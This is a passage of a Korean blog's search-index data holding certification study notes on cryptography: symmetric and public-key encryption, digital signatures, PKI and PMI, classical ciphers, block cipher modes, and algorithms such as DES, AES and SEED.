Key, 대칭키(Symmetric Key), 관용키 (Conventional Key) 라고도 함.                  이미지 출처       대칭키 암호화 기법의 특징            기밀성을 제공하나 무결성, 인증, 부인방지는 보장할 수 없으며, 암호화와 복호화 속도가 빠르다.       같은 키를 사용하므로 안전한 키 전달 및 공유 방법이 필요하며, 대용량 Data 암호화에 적합하다.           세션키(Session Key)            IPSEC, SSL 등을 학습하다 보면 세션키라는 말이 나온다. 세션키는 송신자와 수신자가 연결하고 있는 동안만 사용하는 암호화키이며, 송신자와 수신자가 같은 암호화키를 가지고 있는 것이다. 세션키는 다른 말로 임시키라고도 한다. 즉, 연결이 종료되면 세션키는 사라진다.                대칭키 암호화의 종류                                  구분           스트림 암호(Stream Cipher)           블록 암호(Block Cipher)                                           개념           하나의 Bit, 또는 바이트 단위로 암호화           여러 개의 Bit를 묶어 블록 단위로 암호화                             방법           평문을 XOR로 1Bit 단위로 암호화           블록 단위로 치환.대칭을 반복하여 암호화                             장점           실시간 암호, 복호화, 블록 암호화보다 빠름           대용량의 평문 암호화                             종류           RC4, SEAL, OTP           DES, 3DES, AES, IDEA, Blowfish, SEED                           2. 공개키 기반 키 분배 방식의 원리     공개키 암호화(Public Key)의 주요 특징            암호화 키와 복호화 키가 다른 암호화 방식, 키 교환은 키 합의 또는 키 전송을 사용한다.       공개키/개인키를 사용하여 인증, 서명, 암호화를 수행한다.       공개키로 암호화하여 메시지를 전송, 개인키로 복호화한다.       대칭키 암호화 기법의 키 공유 문제를 해결한 방법이지만 암호화키의 길이가 길어서 암호화 및 복호화의 성능이 떨어진다.                공개키 암호화의 필요성                                  필요성           주요 내용                                           키 관리 문제           비밀키의 배분, 공유 문제, 수많은 키의 저장 및 관리 문제                             인증           메시지의 주인을 인증할 필요                             부인방지           메시지의 주인이 아니라고 부인하는 것을 방지                                공개키 암호화 방식              이미지 출처            공개키 암호화 종류                                  구분           특징           수학적 배경           장점           단점                                           Diffie Hellman           ⦁ 최초의 공개키 알고리즘 ⦁ 키 분배 전용 알고리즘           이산대수 문제           ⦁ 키 분배에 최적화 ⦁ 키는 필요 시에만 생성, 저장 불필요           ⦁ 암호 모드로 사용 불가(인증 불가) ⦁ 위조에 취약                             RSA           대표적 공개키 알고리즘           소인수분해           여러 Library 존재           컴퓨터 속도의 발전으로 키 길이 증가                             DSA           전자서명 알고리즘 표준           이산대수 문제           간단한 구조(Yes or No의 결과만 가짐)           ⦁ 전자서명 전용 ⦁ 암호화, 키 교환 불가                             ECC           ⦁ 짧은 키로 높은 암호 강도 ⦁ PDA, 스마트폰, 핸드폰           타원 곡선           ⦁ 오버헤드 적음 ⦁ 160키 = RSA 1024           키 테이블(20 Kbyte) 필요                           3. 공개키 암호화와 대칭키 암호화 방식의 차이점                  항목       대칭키 암호화       공개키 암호화                       키 관계       암호화 키 = 복호화 키       암호화 키 != 복호화 키                 안전한 키 길이       128Bit 이상       2048Bit 이상                 구성       비밀키       공개키,개인키                 키 개수       N(N-1)/2       2N(키 쌍으로는 N)                 대표적인 예       DES, 3DES, AES       RSA, ECC                 제공서비스       기밀성       기밀성, 부인방지, 인증                 목적       Data 암호화       대칭키 암호화 전달(키 분배용)                 단점       키 분배 어려움, 확장성 떨어짐       중간자 공격(대응 PKI)                 암호화 속도       공개키(비대칭키)보다 빠름       대칭키보다 느림           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","정보보안 일반","접근 통제"],
        "url": "https://bluesplatter.com/is_certification/ISCert-04IS-02AccessControl/",
        "teaser": null
      },{
        "title": "04.정보보안 일반 - 03.전자서명",
        "excerpt":"전자서명 인증 구조 및 주요 특징  1. 전자서명(Digital Signature)의 이해     전자서명(Digital Signature)의 정의            작성자의 신원과 전자문서 변경 여부를 확인할 수 있도록 전자문서를 비대칭 암호화 방식을 이용하여 전자서명 생성키로 생성한 정보       개인의 고유성을 주장하고 인증받기 위해서 전자적 문서에 서명하는 방법으로 무결성, 추적성 확보를 목적으로 함           암호화 키            5개의 암호화키가 사용됨       송신자의 사설키(개인키)와 공개키       수신자의 사설키(개인키)와 공개키       대칭키(비밀키)       사용방법                    송신자 개인키 : 전자서명           송신자 공개키 : 전자서명 확인           수신자 개인키 : 복호화           수신자 공개키 : 암호화                                전자서명의 특징                                  특징           상세 내용                                           서명자 인증(Authentication)           전자서명을 생성한 서명인을 검증 가능(서명자의 공개키)                             부인방지(Non-Repudiation)           서명인은 자신이 서명한 사실을 부인 불가                             위조 불가(Unforgeable)           서명인의 개인키가 없으면 서명을 위조하는 것은 불가함                             변경 불가(Unalterable)           이미 한 서명을 변경하는 것은 불가                             재사용 불가(Not-Reusable)           한 문서의 서명을 다른 문서의 서명으로 재사용 불가                           전자서명 기능            사용자 인증                    서명문의 서명자임을 제3자가 확인           비대칭(공개키) 암호화 기법 이용                       메시지 인증                    메시지 내용의 무결성 보증           해시함수 이용                           2. 전자서명 과정      이미지 출처      송신자            hash(message) -&gt; message digest       enc(message digest, 송신자 개인키) -&gt; 전자서명                enc(전자서명, 대칭키) -&gt; 전자서명 암호화                        enc(message, 대칭키) -&gt; 암호화된 메시지               enc(대칭키, 수신자 공개키) -&gt; 전자봉투           수신자                     dec(전자봉투, 수신자 비밀키) -&gt; 대칭키               dec(전자서명 암호화, 대칭키) -&gt; 전자서명                dec(전자서명, 송신자 공개키) -&gt; message digest               dec(암호화된 메시지, 대칭키) -&gt; message                hash(message) -&gt; message digest               message digest 비교           3. 전자서명 기법의 종류   1. RSA 전자서명     RSA 암호화 알고리즘을 사용해서 메시지에 전자서명을 한다.   RSA 방식은 암호화와 복호화를 하는 경우 송신자의 개인키와 공개키로 사용한다.   소인수 분해의 어려움을 기반으로 하는 전자서명이다.   2. ElGamal 전자서명     1985년 발표된 것으로 이산대수 문제를 이용한 전자서명이다.   전자서명의 안전성은 이산대수 문제에 기반하고 있다.   ElGamal 은 암호화 알고리즘으로는 사용할 수가 없고 오직 전자서명만 가능하다.   서명자 A는 자신의 개인키를 사용하여 메시지에 전자서명을 한다.   3. Schnorr 전자서명     IC 카드에 적합한 전자서명 방식이다.   ElGamal를 기반으로 하고 서명의 크기를 줄이기 위해서 제안된 방식이다.   4. DSS     Digital Signature Standard   미국 저자서명 표준으로 ElGamel 전자서명을 개량한 것이다.   RSA와 다르게 암호화키 교환과 암호화는 지원하지 않고 오직 전자서명만 지원한다.   ElGamal 전자서명 방식으로 서명 검증을 개량한 것으로 서명 검증의 부하를 줄이기 위해서 계산량을 줄인 방식이다.   5. KCDSA     Korea Certificate-based Digital Signature Algorithm   1996년 개발된 국내 전자서명 표준으로 국내 전자서명법을 준용하여 인감과 같은 법적 효력을 가지고 있다.   1998년 한국정보통신기술 협회에서 국가 표준으로 제정되었다.   이산대수를 기반으로 하는 전자서명 알고리즘이다.   6. ECC 전자서명     ECDSA(Elliptic Curve Digital Signature Algorithm)로 타원곡선을 기반으로 하는 전자서명이다.   타원곡선 알고리즘은 짧은 키를 사용하기 때문에 전자서명을 짧은 시간 내에 생성가능하게 되었다.   PKI 구조  1. PKI(Public Key Infrastructure) 개요  1. 개념     공인인증의 구조를 말하며, 공인인증서(X.509, ITU-T 표준)를 통해서 인증 받는 구조   인증기관(CA)에 사용자 정보를 입력하고 공인인증서를 발급 받는다.   인증기관은 사용자 신원을 확인하고 인증서를 발급해 주는 구조   사용자가 너무 많기 때문에 사용자 신원확인을 대행해 주는 등록기관(RA) 필요   등록기관이 신원확인을 하고 인증기관이 공인인증서를 발급해 줌   인증기관 인증서 취소 목록(CRL) 을 관리해서 인증서의 유효성을 확인   공개키 알고리즘을 사용해서 암호화 및 전자서명을 하기 위한 보안 시스템으로 디지털 인증서를 사용해서 사용자를 인증할 때 사용   2. PKI(Public Key Infrastructure) 목적                  목적       주요 내용       요소기술                       인증(Authentication)       사용자에 대한 확인, 검증(공개키 인증)       Certificate                 기밀성(Confidentiality)       송수신 정보에 대한 암호화       암호화, 복호화                 무결성(Integrity)       송수신 정보의 위/변조 방지       해시함수(MD)                 부인봉쇄(Non-Repudiation)       송수신 사실에 대한 부인방지       전자서명                 접근 제어(Access Control)       허가된 수신자만 정보에 접근 가능       DAC, MAC, RBAC                 키 관리(Key Management)       공개키 발급, 등록, 관리, 폐기                   2. PKI 구성  1. PKI 구조와 구성요소      이미지 출처      정책승인기관(PAA)   정책인증기관(PCA)   인증기관(CA)   등록기관(RA)   인증서 폐기 목록(CRL)   디렉터리(X.500 및 LDAP)   X.509 인증서   2. PKI 세부 구성 내용                  구성요소       주요 기능                       인증기관(CA) Certification Authority       ⦁ 인증 정책 수립, 인증서 및 인증서 폐기 목록 관리(생성, 공개, 취소, 재발급) ⦁ 공개키 인증서를 자신의 개인키로 서명 ⦁ 공개키와 개인키 쌍의 소유자 신분 증명 ⦁ 다른 CA와 상호 인증 ⦁ CRL(Certificate Revocation List, 인증서 폐기목록) 등록 및 인증 절차 작성                 등록기관(RA) Registration Authority       ⦁ 사용자 신원 확인, 인증서 요구 승인, CA에 인증서 발급 요청 ⦁ 디지털 인증서 신청자의 식별과 인증을 책임 ⦁ PKI를 이용하는 Application과 CA 간 인터페이스 제공 ⦁ 대표적 RA : 은행, 증권사                 CRL (Certificate Revocation List)       ⦁ 인증서 폐기 목록 ⦁ 인증서의 지속적인 유효함을 점검하는 도구 ⦁ 폐지 사유 : 디지털 서명의 개인키 노출, 인증서가 필요 없을 경우, 개인키 분실, 인증서 효력 정지 등 ⦁ OCSP : 인증서 상태에 관한 정보를 조회 또는 CRL 검색 프로토콜                 Directory       ⦁ 인증서, 암호키에 대한 저장, 관리, 검색 등의 기능, PKI 관련 정보 공개 ⦁ 디렉터리 표준 형식으로는 X.500(DAP, Directory Access Protocol)과 이것을 간략화시킨 LDAP(Lightweight Directory Access Protocol)가 있음                 CPS (Certification Practice Statement)       ⦁ 인증서 실무 준칙 문서 ⦁ PKI를 구현하기 위한 절차를 상세히 설명해 놓은 문서로 CA의 운영을 통제하는 상세한 일련의 규정 ⦁ 인증 정책, 인증 절차, 비밀키 관리 절차 등을 포함 ⦁ 모든 사용자에게 반드시 공개해야 함(홈페이지에 게시)                 X.509       ⦁ X.500 디렉터리 서비스에서 서로 간의 인증을 위해 개발된 것 ⦁ CA에서 발행하는 인증서를 기반으로 함, 공개키 인증서 표준 포맷 ⦁ 공개키 인증서의 포맷 표준 : 발행자, 소유자, 소유자의 공개키, 유효기간, 고유번호, 알고리즘 ⦁ 사용자의 신원과 키 정보를 서로 결합한다는 것을 의미           3. PKI 세부 내용  1. 인증서 발급센터와 인증기관          인증서 발급센터              이미지 출처              Root CA, 정책 승인 기관(Policy Approving Authority), 정책 인증기관(Policy Certification Authority), 인증기관(Certification Authority) 으로 나뉘어짐       사용자들이 사용하는 X.509 인증서(공인 인증서)를 발급       등록기관(RA)이 인증기관 하위에서 사용자 신원 확인 역할수행       은행에서 발급받은 인증서를 증권회사에 인증받기 위해서 인증기관 간의 상호인증을 수행하는 실시간 프로토콜(OCSP)을 사용           2. OCSP(Online Certificate Status Protocol)      OCSP(Online Certificate Status Protocol)      이미지 출처   3. 디렉터리 서비스(Directory Services)      이미지 출처      API(Application Program Interface)를 활용하여 데이터를 입력, 수정, 삭제, 조회할 수 있는 서비스   ITU-T 표준 X.500   IETF 표준 LDAP   DAP(Directory Access Protocol) 프로토콜을 활용하여 작업을 수행   4. 공개키 인증서(X.509 인증서)     1988년 ITU(International Telecommunications Union)에 의해 표준으로 개발   1993년 두 번째 버전 출시 : 2개의 인식자가 첨가   1997년 세 번째 버전에서 확장 영역이 추가   IETF(Internet Engineering Task Force)가 인터넷상에서 X.509 인증서 사용을 결정함, 인증서의 확장영역에 인터넷 사용에 필요한 요건을 정함   5. X.509 인증서의 포함 내용     인증서 버전, 인증서 고유번호, 발급자의 서명, 발급자 정보   인증서 유효기간, 주체 정보, 공개키, 주체키        X.509 인증서의 ASN.1 구조                                  구성           설명                                           OID(Object Identifiers)           다양한 정보를 나타내기 위해 사용(예: CA가 사용하는 RSA 또는 DSA와 같은 알고리즘, 인증 정책 등을 X.509 인증서에 기록하기 위해 사용)                             AI(Algorithm Identifiers)           암호 알고리즘과 키에 대한 정보(예: X.509 인증서가 사용하는 전자서명 알고리즘, 공개키와 관련된 알고리즘을 알 수 있음)                             DS(Directory String)           ⦁ 텍스트(text) 정보 ⦁ DS는 다양한 언어와 문자를 사용할 수 있도록 PrintableString, TeletexString, BMPString, UTF8String, UniversalString 등 여러 형태로 정의                             DN(Distinguished Names)           국제적 디렉터리(directory)에서 X.509 인증서를 식별해야 하기 때문에 계층적으로 이름을 부여                             GN(General Names)           X.509 인증서의 이름을 암호화하기 위한 것으로, GN은 7개의 표준 이름 형태를 사용                           PMI  1. PMI(Privilege Management Infrastructure)     권한관리 기반구조(PMI)는 Attribute Certificate를 발급, 저장, 유통을 제어하여 권한관리 자원과 소유자 간의 관계를 신뢰기관이 보증하고 유지하는 권한관리 기반구조이다.   기존 공개키 인증서는 신원 확인용으로만 사용되어 권한인증 서비스가 불가능하고, 패스워드 방식의 접근통제에 대한 불편함을 해결하기 위하여 필요하다.   2. 속성인증서(AC : Attribute Certificate)     속성인증서(AC : Attribute Certificate)는 속성관계를 확인하는 PMI용 인증서   속성 관리 기관에서 속성정보를 바탕으로 발급   속성인증서와 속성인증서의 공개키 인증서를 연결하여 권한을 검증   속성인증서는 기존의 신원 확인을 위한 공개키 인증서의 확장 필드를 이용하거나, 신원 확인용과 별도의 속성인증서를 발급하여 관리하는 두 가지 구현 방안이 있음.   속성 인증서(Attribute Certificate) : 신원 확인 및 권한 관리   3. PMI의 구성요소      이미지 출처   4. PMI 세부 내용                  구성요소       세부 내용                       SOA (Source of Authority)       PKI의 루트 CA와 유사한 역할, 권한 검증자가 무조건 신뢰함                 AA (Attribute Authority)       SOA로부터 권한의 전부 또는 일부를 위임받아 인증서 발급 업무 수행                 권한 소유자(Privilege Holder)       인증서를 통해 AA로부터 권한에 대한 소유권을 보증 받은 자(PKI의 End-Entity에 해당)                 권한 검증자(Privilege Verifier)       속성 인증서로 사용자의 권한을 검증함           전자서명 응용 프로그램     전자투표의 개념(Electronic Voting)            투표소에 전자투표기를 설치하여 투표를 하거나 컴퓨터를 사용해서 투표하는 방식       e-투표라고도 하며 인터넷을 사용해서 투표를 할 수 있다.           전자투표 시스템 구성요소            전자 투표기 : 사용자를 인증한 뒤 화면에 나오는 영상을 보고 투표 한다.       개표 시스템 : 전자개표 프로그램을 사용해서 개표를 수행하는 컴퓨터 시스템       전자검표 시스템 : 투표 기록기를 읽어서 판독을 수행한다.           전자투표 시스템의 요구사항            투표소 전자투표(Poll Site E-Voting) : 유권자가 투표소를 방문해서 직접 투표                    PSEV 방식 : 투표소에 설치된터치스크린을사용해서 투표                       인터넷 투표(Remote Internet E-Voting) : 투표소에 방문하지 않고 인터넷을 사용해서 투표                    RESV 방식 : 컴퓨터를 사용하거나 SMS 문자, 디지털 TV 등을 사용하여 투표                            편의성 증대, 유권자의 참여가 증가               비밀투표가 침해될 가능성, 보안에 대한 위험성이 높아짐                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","정보보안 일반","전자서명"],
        "url": "https://bluesplatter.com/is_certification/ISCert-04IS-03DigitalSignature/",
        "teaser": null
      },{
        "title": "04.정보보안 일반 - 04.암호학",
        "excerpt":"암호화  1. 시저암호와 암호화의 개요     시저암호(Caesar Cipher) : 최초의 암호화, 알파벳을 일정한 문자 수만큼 평행 이동을해서 암호화        평문                                  1           2           3           4           5           6           7           8           9           10                                           A           B           C           D           E           F           G           H           I           J                                암호문                                  1           2           3           4           5           6           7           8           9           10                                           H           I           J           A           B           C           D           E           F           G                           전사공격            시저암호의 경우 영문자 26자에 대해서 평문과 암호문을 모두 나열해 보면 바로 해독됨       모든 범위의 평문과 암호문을 나열하여 암호화를 해독하는 것을 전사공격이라 함.           2. 암호화(Encryption)     암호화            평문을 암호화키를 사용해서 암호문으로 만들고, 암호문을 복호화키를 사용해서 평문으로 만드는 일련의 과정                암호화와 복호화 과정              이미지 출처              평문(Plaintext)을 암호화키(Encryption)를 사용해서 암호문(Ciphertext)으로 만들고 복호화키(Decryption Key)를 사용해서 평문으로 복원하는 과정                암호화 세부 내용                                  구분           특징                                           암호학(Cryptology)           ⦁ 암호 기법(Cryptography) : 암호화와 복호화의 원리, 절차 및 방법론에 관한 학문 ⦁ 암호 해독(Cryptanalysis) : 암호문으로부터 복호화 키를 찾아내거나 암호문을 평문으로 복원하려는 노력 또는 그에 관한 학문                             평문(Plaintext)           일반인이 이해할 수 있는 형태의 정보                             암호문(Ciphertext)           평문을 이해할 수 없는 형태로 변형한 문장                             암호화(Encryption)           비밀성 보장을 위해 암호 알고리즘에 의해 평문을 암호문으로 바꾸는 과정                             복호화(Decryption)           암호화된 문장을 평문으로 바꾸는 과정                             알고리즘           특수한 순서로 평문에 적용되는 복잡한 수학공식                           3. 치환 암호(Substitution Cipher)          암호화 역사                                  구분           특징                                           고전 암호           ⦁ 단순한 문자 대입 방법으로 통계적 특성을 분석하여 암호문 해독이 가능했음 ⦁ 대표적 암호 : 시저 암호, Vigenere(비제네르, 비즈네르) 암호                             근대 암호           ⦁ 기계를 이용하여 암호 알고리즘을 실현 ⦁ 대표적 암호 : ENIGMA(평문을 자판으로 입력하면 각 회전자에 의해 암호문 변환)                             현대 암호           ⦁ 1940년 말 Claude elwood shannon(클로드 섀넌)의 정보 이론에 의해 현대 암호학 시작 ⦁ 다양한 이론에 의해 복잡도가 높은 암호 알고리즘의 실현                           시저암호는 전사공격에 취약하므로 단일 치환 암호(Simple Substitution Cipher) 가 등장            어떻게 변환하는지를 알 수 있는 치환표가 있어야 함.       복호화도 치환표를 사용해서 거꾸로 복호화       빈도수 공격에 취약           다중 치환 암호(Polyalphabetic Substitution Cipher)            단일 치환 암호의 빈도수 공격의 문제점을 해결하기 위해 암호문에 나타나는 빈도수를 거의 균등하게 만드는 암호화 기법       비제네르(Vigenere) 및 힐(Hill) 암호화           4. 다중 치환 암호 힐(Hill) 암호화     개요            평문의 문자에 해당 정수 값을 부여하고 m개의 문자를 치환하는 암호화 방법           힐 암호화            k는 암호화 키, p는 평문, C는 암호문, mod는 나머지 계산 (알파벳이 26개이므로 26으로 나머지를 계산)       C1 = (k11 p1 + k12 p2 + k13 p3) mod 26       C2 = (k21 p1 + k22 p2 + k23 p3) mod 26       C3 = (k31 p1 + k32 p2 + k33 p3) mod 26           5. 암호화 기법          암호화 기법                                  구분           유형           특징                                           고대           치환(Substitution)           ⦁ 문자열을 다른 문자열로 이동하면서 교체 ⦁ 평문을 추론하기 어렵게 만듦                                         전치(Transposition) 순열(Permutation)           ⦁ 무작위로 보이는 원칙에 따라서 문자의 순서를 바꾸는 것 ⦁ 확산의 성질로 암호문을 퍼뜨려 숨김                             현대           대칭키 암호화           송/수신자의 키가 동일한 암호화 방식                                         공개키 암호화           암호화 키와 복호화 키가 다른 암호화 방식                                         타원곡선암호(ECC)           ⦁ Elliptic Curve Cryptography ⦁ 공개키 암호 시스템의 큰 키값을 이용해야 하는 단점을 보완                                         양자암호           ⦁ Quantum Cryptography, 현재 활발한 연구 중 ⦁ 이론적으로만 존재하는 것으로 여기던 완벽한 암호 시스템                                  근대암호에서 애니그마는 독일의 세르비우스에 의해서 개발됨                    송신자와 수신자는 애니그마 기계를 한 대씩 가지고 있어야 함           송신자와 수신자 모두 코드북이 있어야 함           코드북은 날짜 키를 가지고 있음                       공개키 암호화                    RSA : 소인수분해           DSA : 이산대수           ECC : 타원곡선           Diffie-Hellman : 키 교환                       대칭키 암호화                    스트림 암호화                            비트단위 암호화               XOR로 1Bit 암호화               하드웨어로 구현이 용이, 빠름               RC4, SEAL, OTP                                   블록 암호화                            종류                                    Feistel 구조 : 역함수 없음, DES, SEED                   SPN (Substitution Permutation Network)                   구조 : 역함수 있음, AES                                               종류                                    ECB : 가장 간단, 병렬처리                   CBC : 초기화 벡터 사용, 가장 강력함                   CFB : 순차적 암호화, 병렬적 복호화                   OFB : 디지털화 된 아날로그 신호 등                   CTR : 카운터를 사용한 암호화                                                                   종류                            DES : 56Bit 키, 16라운드               3DES : 168Bit 키, 48라운드               AES : NIST 표준, 128Bit 키               IDEA : 128Bit, 8라운드               SEED : 128Bit, 16라운드                                                   Claude Shannon의 Information Theory(정보이론)            혼돈 : 암호문과 평문과의 상관관계를 숨김, 대치를 통해 구현함       확산 : 평문의 통계적 성질을 암호문을 전반에 퍼뜨러 숨김, 전치로 구현, 평문과 암호화 키의 각 Bit들은 암호문의 모든 Bit에 영향을 주어야 함.           암호화가 해독되는 이유            암호화 알고리즘이 공개된 경우       해당 문자의 치우침에 따라 통계가 가능할 경우       해당암호에 대한 예문을 많이 보유하고 있는 경우           스트림(Stream) 암호화  1. 스트림 암호화     개념            비트 혹은 바이트 단위로 암호화를 수행       암호화와 복호화에 동일한 키 스트림 생성기를 사용       고속으로 암호화할 수 있고 경량임 -&gt; 무선 환경, 고속으로 동작하는 시스템에 적용       하드웨어로 구현이 용이                무선 LAN의 WEP에서 사용하는 RC4 암호화              이미지 출처              정적키에서 난수(셔플링 기법-256개의 바이트 수를 섞은 후 256 바이트 중 하나를 선택)로 임의의 키를 선택해서 키 스트림을 결정       송신자와 수신자 사이에 키 스트림을 사전에 교환       메시지를 비트(Bit)로 변경하고 키 스트림과 XOR 하여 암호화       암호화키 유출에 주의           2. 동기식 스트림 암호     Gilbert Vernam이 개발한 One Time Pad   랜덤 번호를 생성해서 송신자와 수신자가 랜덤 키를 교환   3. 비동기식 스트림 암호     키 스트림을 생성할 때 이전의 평문 및 암호문에 종속적으로 생성   블록 암호화  1. 블록 암호화 알고리즘 구조     사전에 공유한 암호키를 사용해서 고정된 길이의 입력 블록을 고정된 길이의 출력 블록으로 변환하는 알고리즘   암호화를 수행하기 전에 평문을 고정된 블록으로 나누어 각각 암호화를 수행   Feistel 구조            암호화와 복호화 과정이 동일       역변환이 가능한 방법       하드웨어 및 소프트웨어로 구현이 쉬움       DES, SEED, CAST-128, BLOWFISH           SPN(Substitution Permutation Network) 구조            혼돈과 확산 이론에 기반       암호화 과정과 복호화 과정이 다름       AES, SAFER, SHARK, CRYPTON           기타 구조            IDEA           2. 블록 암호화 기법(Block Cipher)  1. ECB(Electronic Code Book) Mode      이미지 출처      가장 단순한 모드   평문을 일정한 블록단위로 나누어 순차적으로 암호화하는 구조   DES : 64Bit, AES : 128Bit   각각의 블록은 독립적 -&gt; 특정 블록의 에러가 다른 블록에 영향을 주지 않음   평문을 각각의 단위로 나눌 때, 배수에 미치지 못하여 남는 Bit는 패딩(Padding, 빈 데이터)을 추가하여 크기를 맞춰야 함      이미지 출처      한 개의 블록만 해독이 되면 나머지 블록 또한 해독되는 단점   2. CBC(Cipher Block Chaining) Mode      이미지 출처      ECB 모드와 동일한 방법으로 평문을 일정한 블록단위로 나눔   최초 키의 생성 버퍼로 IV(Initialization Vector)가 사용되어 첫 번째 블록과 XOR 연산을 통해 암호화가 됨   IV는 나누어진 일정한 블록 중 하나가 되거나 단위 블록과 길이가 같은 임의의 값이 될 수 있음   두 번째 블록부터는 첫 번째 블록의 암호화된 블록과 XOR 연산을 하여 암호화가 진행됨   암호문 한 개의 블록에서 에러 발생 시 현재 복호화 되는 평문 블록과 다음 복호화되는 평문 블록에 영향을 줌   블록 암호화 모드 중 보안이 가장 강력한 암호화 모드로 평가되며 가장 많이 사용   ECB와 동일하게 배수를 맞추기 위한 패딩을 추가하여 크기를 맞춰야 함.      이미지 출처      암호화 및 복호화 시 병렬처리가 불가능하여 순차적으로 암호화해야 한다는 단점을 가지고 있음.   3. CFB(Cipher FeedBack) Mode      이미지 출처      ECB, CBC와 달리 평문과 암호문의 길이가 같음.   패딩을 추가하지 않고 블록단위 암호화를 스트림 암호화 방식으로 구성하여 Bit 단위로 암호화를 수행 (패딩이 필요 없음, 암호문에 대해서 암호화를 반복하면 평문이 됨) 하기 때문   CBC와 마찬가지로 IV가 사용되고, 암호화는 순차적으로 처리하며 복호화는 병렬처리가 가능      이미지 출처      암호문 한 개의 블록에서 에러 발생 시 현재 복호화 되는 평문 블록과 다음 복호화되는 평문 블록에 영향을 줌   4. OFB(Outer FeedBack) Mode      이미지 출처      CFB와 동일하게 평문과 암호문의 길이가 같음   패딩을 추가하지 않고 블록단위 암호화를 스트림 암호화 방식으로 구성   암호화 함수는 키의 생성시에만 사용됨      이미지 출처      암호화와 복호화의 방법이 동일, 암호문을 다시 암호화하면 평문이 나옴   최초 키의 생성 버퍼로 IV가 사용됨   암호문 한 개의 블록에서 에러 발생 시 현재 복호화되는 평문 블록에만 영향을 줌   영상 데이터, 음성 데이터와 같은 디지털화된 아날로그(Digitized analog) 신호에 주로 사용됨.   5. CTR(CounTeR) Mode      이미지 출처      평문블록과 키스트림을 XOR 연산하여 암호문을 만듦   키 스트림은 암호화 시마다 1씩 증가하는 카운터를 암호화한 Bit열   암호화와 복호화 방법이 동일하므로 구현이 간단   블록의 암호화 순서가 임의의 순서가 될 수 있음 -&gt; 병렬처리 가능   OFB와 마찬가지로 암호문 블록의 에러 발생 시, 한 개의 평문 블록에만 영향을 줌.   암호화 알고리즘의 종류  1. DES(Data Encryption Standard)     DES(Data Encryption Standard)            IBM에서 개발한 대칭키 암호화 알고리즘       1997년 미국 표준국(NIST)에서 표준으로 채택           DES 특징            64Bit 블록단위 암호화를 수행하며 56Bit 키를 사용       키 길이가 짧다는 문제점을 가짐       64Bit의 평문과 키를 입력받아 64Bit 암호문을 생성       56Bit에서 8Bit가 늘어난 이유는 7Bit 마다 Check Bit를 넣었기 때문       치환 암호(Substitution Cipher)와 전치 암호(Transposition Cipher)를 혼합한 혼합 암호(Product Cipher)를 사용       DES는 내부에서 XOR, 자리바꿈, 순환이동, 치환 등을 사용하고 S-BOX를 제외하고 나머지 연산은 모두 선형임.       즉, S-BOX를 제외하고 나머지는 역으로 취할 수 있으므로 DES의 안전성에서 S-BOX가 가장 중요한 부분이다.                  이미지 출처              Feistel 구조이다.                DES 암호화 및 복호화의 혼합 암호화(Product Cipher)              이미지 출처              DES는 64Bit의 블록을 입력 받아 56Bit의 키 (실제로는 패리티 Bit를 넣어 64Bit)로 암호화해서 64Bit의 블록을 출력한다.                  이미지 출처              입력 받은 64Bit를 초기 순열을 이용해서 재배열한다. 초기 순열에는 전치할 순서가 들어있다. 예를 들어 1번 자리는 45번으로, 34번은 4번으로 등의 순서가 저장된다. 그리고 치환되어 나온값은 키를 이용해 XOR 연산과 Feistel 연산을 거쳐서 변환한다.       역 순열을 이용해 다시 재배열한다. 이것이 1라운드이며 16번 반복한다. 즉, 총 16라운드를 수행한다.       현재의 암호화는 대칭키 암호화를 위해서 키의 길이는 128Bit 이상으로 사용한다.           2. IDEA(International Data Encryption Algorithm)     스위스에서 개발한 대칭키 알고리즘으로 빠른 암호화 방법을 지원한다.   128Bit의 키를 사용해서 64Bit의 평문을 8라운드에 걸쳐서 64Bit 암호문으로 생성한다.   DES 방식의 암호화 기법보다 2배 정도 빠르게 암호화를 수행한다.   16Bit 단위로 연산이 이루어지며 16Bit 프로세서(Processor)에서 구현이 용이하다.   안전성을 인정받아서 전자우편 보안을 위한 PGP 방식에 사용된다.   블록암호화 알고리즘을 사용하고 하드웨어와 소프트웨어로 구현이 용이하다.   3. RC5(Ron’s Code 5) 알고리즘     1994년 미국 RSA 연구소의 리베스트(Rivest)가 개발한 알고리즘이다.   알고리즘이 간단하여 빠르게 암호화하고 복호화할 수가 있으며 DES보다 약 10배 정도빠른 속도를 가진다.   32Bit, 64Bit, 128Bit의 키를 가진다.   4. AES(Advanced Encryption Standard)     AES(Advanced Encryption Standard)            Rijindael 알고리즘                  이미지 출처              SPN 구조       미국 연방표준 알고리즘       DES를 대신하는 차세대 표준 암호화 알고리즘       미국 상무성 산하 NIST(National Institute of Standards and Technology) 표준 알고리즘       블록길이는 128Bit, 192Bit, 256Bit 의 3종류로 구성됨           AES 특징            암호화 및 복호화가 빠르고 공격에 대해서 안전하다.       간단한 하드웨어 및 소프트웨어 구성이 편리하다.       이론적으로 키의 크기는 제한이 없다.           5. SEED     SEED 개념            KISA와 ETRI에서 개발       TTA와 ISO/IEC에서 국제표준으로 제정된 128Bit 키 블록 단위로 메시지를 처리하는 대칭키 블록 암/복호화 알고리즘                SEED 특징                                  구분           특징                                           키 길이           128Bit 고정 키 사용                             블록 암호화           128Bit 길이 블록단위 암호화, 16Round                             암호화 방식           DES와 같은 Feistel(전치, 치환, XOR 사용)                             운영 모드           일반적 블록 암호화 운영 모드(ECB, CBC, CFB, OFB)                                SEED 세부 내용                                  구분           특징                                           평문 블록화           128Bit 평문을 64Bit씩 Lo, Ro 블록으로 나눔                             F 함수           64Bit Fiestel 형태로 구성(16Round) 입력:64Bit 블록과 64Bit 라운드 키, 출력:64Bit 블록 출력                             암호문           암호화된 64Bit 블록 조합하여 128Bit 암호문 출력                           6. 대칭키 암호화 기법 차이점  1. 대칭키 암호화 기법                  구분       블록 크기       키 크기       Round       주요 내용                       DES       64Bit       56Bit       16       키 길이가 짧아 해독이 용이                 3DES       64Bit       168Bit       48       DES의 Round 수를 늘려 보안성을 강화                 AES       128Bit       128/192/256Bit       10/12/14       미국 표준 암호화 알고리즘                 IDEA       64Bit       128Bit       8       암호화 강도가 DES 보다 강하고, 2배 빠름                 SEED       128Bit       128Bit       16       국내에서 개발, ISO/IEC, IETF 표준           2. 대표적인 대칭키 암호화 기법                  구분       SEED       3DES       AES                       특징       안전성, 빠른 암호화 속도       DES 호환성, 느린 암호화 속도       안정성, 효율성, 구현 용이성                 키 길이       128Bit       168Bit       128Bit, 192Bit, 256Bit                 Block       128Bit(16Round)       64Bit(16*3 Round)       3Layer 기반 Round 구조                 개발 기관       